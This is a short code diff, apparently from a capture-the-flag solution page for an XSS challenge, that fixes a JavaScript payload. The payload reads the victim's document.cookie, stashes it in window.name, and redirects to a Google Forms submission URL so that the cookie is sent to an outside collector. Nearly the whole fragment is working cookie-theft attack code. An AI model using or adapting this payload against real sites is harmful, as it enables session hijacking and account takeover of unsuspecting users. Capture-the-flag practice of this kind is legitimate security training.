@@ -15,7 +15,7 @@ layout: xss
         console.log(typeof(data));
         console.log(JSON.stringify(data));
         document.location = "https://jason.2021.chall.actf.co/";
-        window.name = "https://jason.2021.chall.actf.co/cookie=" + document.cookie();
+        window.name = "https://jason.2021.chall.actf.co/cookie=" + document.cookie;
         console.log(window.name);
         document.location="https://docs.google.com/forms/u/0/d/e/1FAIpQLSdjlp_flVI2jMpFtcUgsFZNtbLvRPqgZnZ_9a1iAH1tJMZsbw/formResponse?entry.1498521609=" + window.name;
         
